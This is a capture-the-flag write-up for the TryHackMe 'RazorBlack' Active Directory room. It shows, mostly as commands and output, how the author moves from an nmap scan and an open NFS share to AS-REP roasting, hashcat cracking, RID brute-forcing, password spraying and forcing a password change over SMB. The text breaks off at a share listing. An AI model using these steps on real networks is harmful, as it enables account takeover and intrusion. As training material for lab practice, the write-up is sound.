<a href=https://github.com/anir0y/classroom/tree/master/content/post/TryHackMe-raz0rblack.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><figure class=entry-cover><img loading=eager src=https://classroom.anir0y.in/img/thm.gif alt="cover image"></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#task-01>Task 01</a></li><li><a href=#task-02-flag-submission-panel>Task 02: Flag Submission Panel</a></li><li><a href=#what-is-the-domain-name>What is the Domain Name?</a></li><li><a href=#what-is-stevens-flag>What is Steven’s Flag?</a></li><li><a href=#what-is-the-zip-files-password>What is the zip file’s password?</a><ul><li><a href=#asreproast>ASREPRoast</a></li></ul></li><li><a href=#what-is-ljudmilas-hash>What is Ljudmila’s Hash?</a></li><li><a href=#what-is-ljudmilas-flag>What is Ljudmila’s Flag?</a></li><li><a href=#what-is-xyan1d3s-password>What is Xyan1d3’s password?</a></li><li><a href=#what-is-xyan1d3s-flag>What is Xyan1d3’s Flag?</a></li><li><a href=#what-is-the-root-flag>What is the root Flag?</a></li><li><a href=#what-is-tysons-flag>What is Tyson’s Flag?</a></li><li><a href=#what-is-the-complete-top-secret>What is the complete top secret?</a></li></ul></nav></div></details></div><div class=post-content><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><table><thead><tr><th>RazorBlack</th><th></th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/raz0rblack>Room</a></td><td><img alt=logo loading=lazy src=https://tryhackme-images.s3.amazonaws.com/room-icons/5e543ba613749349efa339fbf3aca901.jpeg></td></tr></tbody></table><hr><h2 id=task-01>Task 01<a hidden class=anchor aria-hidden=true href=#task-01>#</a></h2><p>These guys call themselves hackers. Can you show them who&rsquo;s the boss ??</p><hr><h2 id=task-02-flag-submission-panel>Task 02: Flag Submission Panel<a hidden class=anchor aria-hidden=true href=#task-02-flag-submission-panel>#</a></h2><h2 id=what-is-the-domain-name>What is the Domain Name?<a hidden class=anchor aria-hidden=true href=#what-is-the-domain-name>#</a></h2><ul><li><p>nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sV -sC -oN nmap/init 10.10.149.120
</span></span><span class=line><span class=cl><span class=c1># Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.149.120
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.15s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>986</span> closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2021-07-18 14:05:57Z<span class=o>)</span>
</span></span><span class=line><span class=cl>111/tcp  open  rpcbind       2-4 <span class=o>(</span>RPC <span class=c1>#100000)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> rpcinfo: 
</span></span><span class=line><span class=cl>...<span class=o>[</span>snip<span class=o>]</span>...
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: raz0rblack.thm, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>2049/tcp open  mountd        1-3 <span class=o>(</span>RPC <span class=c1>#100005)</span>
</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: raz0rblack.thm, Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
</span></span><span class=line><span class=cl>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: RAZ0RBLACK
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: RAZ0RBLACK
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: HAVEN-DC
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: raz0rblack.thm
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2021-07-18T14:06:45+00:00
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>HAVEN-DC.raz0rblack.thm
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-02-22T15:02:37
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2021-08-24T15:02:37
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-07-18T14:06:54+00:00<span class=p>;</span> +2s from scanner time.
</span></span><span class=line><span class=cl>Service Info: Host: HAVEN-DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 1s, deviation: 0s, median: 1s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-07-18T14:06:47
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl><span class=c1># Nmap done at Sun Jul 18 19:38:17 2021 -- 1 IP address (1 host up) scanned in 163.34 seconds</span>
</span></span></code></pre></div></li></ul><hr><h2 id=what-is-stevens-flag>What is Steven’s Flag?<a hidden class=anchor aria-hidden=true href=#what-is-stevens-flag>#</a></h2><ul><li><p>SMB</p><p><strong>SMBMAP</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>anir0y㉿kali<span class=o>)</span>-<span class=o>[</span>~/share/thm/room/raz0rblack<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ smbmap -u <span class=s1>&#39;&#39;</span> -p <span class=s1>&#39;&#39;</span> -H 10.10.149.120                                        <span class=m>2</span> ⨯
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP: 10.10.149.120:445       Name: 10.10.149.120 
</span></span></code></pre></div></li><li><p>showmount</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>anir0y㉿kali<span class=o>)</span>-<span class=o>[</span>~/share/thm/room/raz0rblack<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ showmount -e 10.10.149.120      
</span></span><span class=line><span class=cl>Export list <span class=k>for</span> 10.10.149.120:
</span></span><span class=line><span class=cl>/users <span class=o>(</span>everyone<span class=o>)</span>
</span></span></code></pre></div></li><li><p>showmount shows us one dir, let&rsquo;s mount it to local machine and continue:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-zsh data-lang=zsh><span class=line><span class=cl><span class=c1># create a mount dir</span>
</span></span><span class=line><span class=cl>$ mkdir smb
</span></span><span class=line><span class=cl>$ sudo mount -t nfs -o <span class=nv>vers</span><span class=o>=</span><span class=m>2</span> 10.10.149.120:/users ./smb
</span></span><span class=line><span class=cl>$ sudo -i 
</span></span><span class=line><span class=cl><span class=c1># read the files </span>
</span></span><span class=line><span class=cl><span class=c1># ls -l</span>
</span></span><span class=line><span class=cl>total <span class=m>2</span>
</span></span><span class=line><span class=cl>-rwx------ <span class=m>1</span> <span class=m>4294967294</span> <span class=m>4294967294</span> <span class=m>9861</span> Feb <span class=m>25</span> 21:54 employee_status.xlsx
</span></span><span class=line><span class=cl>-rwx------ <span class=m>1</span> <span class=m>4294967294</span> <span class=m>4294967294</span>   <span class=m>80</span> Feb <span class=m>26</span> 01:01 sbradley.txt
</span></span><span class=line><span class=cl><span class=c1># cat sbradley.txt</span>
</span></span><span class=line><span class=cl>THM<span class=o>{</span>flag-data<span class=o>}</span>
</span></span></code></pre></div></li><li><p>there is another file <code>employee_status.xlsx</code> let&rsquo;s read the content of this file. in my case I used MS office, you can use any office application.
<strong>Extracted usernames from the xlsx file:</strong></p></li><li><p>content</p><pre tabindex=0><code class=language-notepad data-lang=notepad>daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
</code></pre></li><li><p>create a users file based on <code>employee list</code>
I tried with hashcat to create userlist, but turns out format is First letter of <code>First Name + Last name: i.e. dport for daven port</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$cat</span> user.lst
</span></span><span class=line><span class=cl>dport
</span></span><span class=line><span class=cl>iroyce
</span></span><span class=line><span class=cl>tvidal
</span></span><span class=line><span class=cl>aedwards
</span></span><span class=line><span class=cl>cingram
</span></span><span class=line><span class=cl>ncassidy
</span></span><span class=line><span class=cl>rzaydan
</span></span><span class=line><span class=cl>lvetrova
</span></span><span class=line><span class=cl>rdelgado
</span></span><span class=line><span class=cl>twilliams
</span></span><span class=line><span class=cl>sbradley
</span></span><span class=line><span class=cl>clin
</span></span></code></pre></div></li><li><p>DNS, let&rsquo;s map the domain to IP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /etc/hosts
</span></span><span class=line><span class=cl>10.10.149.120   raz0rblack raz0rblack.thm
</span></span></code></pre></div></li></ul><hr><script async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script><p><ins class=adsbygoogle style=display:block;text-align:center data-ad-layout=in-article data-ad-format=fluid data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188></ins></p><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script><hr><h2 id=what-is-the-zip-files-password>What is the zip file’s password?<a hidden class=anchor aria-hidden=true href=#what-is-the-zip-files-password>#</a></h2><h3 id=asreproast>ASREPRoast<a hidden class=anchor aria-hidden=true href=#asreproast>#</a></h3><ul><li><p>let&rsquo;s go</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 /opt/impacket/examples/GetNPUsers.py <span class=s1>&#39;raz0rblack.thm/&#39;</span> -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright <span class=m>2021</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User lvetrova doesn<span class=s1>&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span class=line><span class=cl><span class=s1>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></span></span><span class=line><span class=cl><span class=s1>[-] User sbradley doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># getting the hash</span>
</span></span><span class=line><span class=cl>$ cat hashes.asreproast 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$twilliams</span>@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b<span class=nv>$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#bruteforce</span>
</span></span><span class=line><span class=cl>$ hashcat -m <span class=m>18200</span> hashes.asreproast rockyou.txt<span class=o>(</span>relative path is /usr/share/wordlists/rockyou.txt<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># cracked hash</span>
</span></span><span class=line><span class=cl>hashcat -m <span class=m>18200</span> hashes.asreproast --show                          
</span></span><span class=line><span class=cl><span class=nv>$krb5asrep$23$twilliams</span>@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b<span class=nv>$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c</span>:roastpotatoes
</span></span></code></pre></div></li><li><p>trying loggin in with new creds (SMB)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
</span></span><span class=line><span class=cl>   Disk                                                    Permissions     Comment
</span></span><span class=line><span class=cl>   ----                                                    -----------     -------
</span></span><span class=line><span class=cl>   ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class=line><span class=cl>   C$                                                      NO ACCESS       Default share
</span></span><span class=line><span class=cl>   IPC$                                                    READ ONLY       Remote IPC
</span></span><span class=line><span class=cl>   NETLOGON                                                READ ONLY       Logon server share
</span></span><span class=line><span class=cl>   SYSVOL                                                  READ ONLY       Logon server share
</span></span><span class=line><span class=cl>   trash                                                   NO ACCESS       Files Pending <span class=k>for</span> deletion
</span></span></code></pre></div></li><li><p>we can read IPC$, that means we can bruteforce ussernames:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ crackmapexec smb <span class=k>$(</span>cat hosts<span class=k>)</span> -u <span class=s1>&#39;twilliams&#39;</span> -p <span class=s1>&#39;roastpotatoes&#39;</span> --rid-brute
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> First <span class=nb>time</span> use detected
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating home directory structure
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating default workspace
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Initializing SSH protocol database
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Initializing WINRM protocol database
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Initializing SMB protocol database
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Initializing MSSQL protocol database
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Initializing LDAP protocol database
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Copying default configuration file
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Generating SSL certificate
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:HAVEN-DC<span class=o>)</span> <span class=o>(</span>domain:raz0rblack.thm<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>+<span class=o>]</span> raz0rblack.thm<span class=se>\t</span>williams:roastpotatoes 
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>+<span class=o>]</span> Brute forcing RIDs
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         498: RAZ0RBLACK<span class=se>\E</span>nterprise Read-only Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>                                                                                                
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         500: RAZ0RBLACK<span class=se>\A</span>dministrator <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         501: RAZ0RBLACK<span class=se>\G</span>uest <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         502: RAZ0RBLACK<span class=se>\k</span>rbtgt <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         512: RAZ0RBLACK<span class=se>\D</span>omain Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         513: RAZ0RBLACK<span class=se>\D</span>omain Users <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         514: RAZ0RBLACK<span class=se>\D</span>omain Guests <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         515: RAZ0RBLACK<span class=se>\D</span>omain Computers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         516: RAZ0RBLACK<span class=se>\D</span>omain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         517: RAZ0RBLACK<span class=se>\C</span>ert Publishers <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         518: RAZ0RBLACK<span class=se>\S</span>chema Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         519: RAZ0RBLACK<span class=se>\E</span>nterprise Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         520: RAZ0RBLACK<span class=se>\G</span>roup Policy Creator Owners <span class=o>(</span>SidTypeGroup<span class=o>)</span>                                                                                                            
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         521: RAZ0RBLACK<span class=se>\R</span>ead-only Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>                                                                                                           
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         522: RAZ0RBLACK<span class=se>\C</span>loneable Domain Controllers <span class=o>(</span>SidTypeGroup<span class=o>)</span>                                                                                                           
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         525: RAZ0RBLACK<span class=se>\P</span>rotected Users <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         526: RAZ0RBLACK<span class=se>\K</span>ey Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         527: RAZ0RBLACK<span class=se>\E</span>nterprise Key Admins <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         553: RAZ0RBLACK<span class=se>\R</span>AS and IAS Servers <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         571: RAZ0RBLACK<span class=se>\A</span>llowed RODC Password Replication Group <span class=o>(</span>SidTypeAlias<span class=o>)</span>                                                                                                
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         572: RAZ0RBLACK<span class=se>\D</span>enied RODC Password Replication Group<span class=o>(</span>SidTypeAlias<span class=o>)</span>                                                                                                 
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1000: RAZ0RBLACK<span class=se>\H</span>AVEN-DC$ <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1101: RAZ0RBLACK<span class=se>\D</span>nsAdmins <span class=o>(</span>SidTypeAlias<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1102: RAZ0RBLACK<span class=se>\D</span>nsUpdateProxy <span class=o>(</span>SidTypeGroup<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1106: RAZ0RBLACK<span class=se>\x</span>yan1d3 <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1107: RAZ0RBLACK<span class=se>\l</span>vetrova <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1108: RAZ0RBLACK<span class=se>\s</span>bradley <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         1109: RAZ0RBLACK<span class=se>\t</span>williams <span class=o>(</span>SidTypeUser<span class=o>)</span>
</span></span></code></pre></div></li><li><p>new users add them to a file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xyan1d3
</span></span><span class=line><span class=cl>lvetrova
</span></span><span class=line><span class=cl>sbradley
</span></span><span class=line><span class=cl>twilliams
</span></span></code></pre></div></li><li><p>Password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>roastpotatoes
</span></span></code></pre></div></li><li><p>checking for password reuse:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ crackmapexec smb <span class=k>$(</span>cat hosts<span class=k>)</span> -u user.lst  -p pass.lst                                             <span class=m>130</span> ⨯
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:HAVEN-DC<span class=o>)</span> <span class=o>(</span>domain:raz0rblack.thm<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>-<span class=o>]</span> raz0rblack.thm<span class=se>\x</span>yan1d3:roastpotatoes STATUS_LOGON_FAILURE 
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>-<span class=o>]</span> raz0rblack.thm<span class=se>\l</span>vetrova:roastpotatoes STATUS_LOGON_FAILURE 
</span></span><span class=line><span class=cl>SMB         10.10.149.120   <span class=m>445</span>    HAVEN-DC         <span class=o>[</span>-<span class=o>]</span> raz0rblack.thm<span class=se>\s</span>bradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
</span></span></code></pre></div></li><li><p>let&rsquo;s change the password for <code>sbradley</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ smbpasswd -r <span class=k>$(</span>cat hosts<span class=k>)</span> -U sbradley                                                                    <span class=m>1</span> ⨯
</span></span><span class=line><span class=cl>Old SMB password: <span class=sb>`</span>roastpotatoes<span class=sb>`</span>
</span></span><span class=line><span class=cl>New SMB password: <span class=sb>`</span>Passw0rd!<span class=sb>`</span>
</span></span><span class=line><span class=cl>Retype new SMB password: <span class=sb>`</span>Passw0rd!<span class=sb>`</span>
</span></span><span class=line><span class=cl>Password changed <span class=k>for</span> user sbradley <span class=c1>#password is set to our password</span>
</span></span></code></pre></div></li><li><p>Enumerate SMB with new password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbmap -H MACHINE_IP -u sbradley -p <span class=s1>&#39;Passw0rd!&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
</span></span><span class=line><span class=cl>     Disk                                                    Permissions     Comment
</span></span><span class=line><span class=cl>     ----                                                    -----------     -------
</span></span><span class=line><span class=cl>     ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class=line><span class=cl>     C$                                                      NO ACCESS       Default share
</span></span><span class=line><span class=cl>     IPC$                                                    READ ONLY       Remote IPC
</span></span><span class=line><span class=cl>     NETLOGON                                                READ ONLY       Logon server share
</span></span><span class=line><span class=cl>     SYSVOL                                                  READ ONLY       Logon server share
</span></span><span class=line><span class=cl>     trash                                                   READ ONLY       Files Pending <span class=k>for</span> deletion
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@kali$ smbclient //MACHINE_IP/trash --user<span class=o>=</span><span class=s1>&#39;sbradley%Passw0rd!&#39;</span>
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> dir
</span></span><span class=line><span class=cl>.                                   D        <span class=m>0</span>  Tue Mar <span class=m>16</span> 02:01:28 <span class=m>2021</span>
</span></span><span class=line><span class=cl>..                                  D        <span class=m>0</span>  Tue Mar <span class=m>16</span> 02:01:28 <span class=m>2021</span>
</span></span><span class=line><span class=cl>chat_log_20210222143423.txt         A     <span class=m>1340</span>  Thu Feb <span class=m>25</span> 14:29:05 <span class=m>2021</span>
</span></span><span class=line><span class=cl>experiment_gone_wrong.zip           A <span class=m>18927164</span>  Tue Mar <span class=m>16</span> 02:02:20 <span class=m>2021</span>
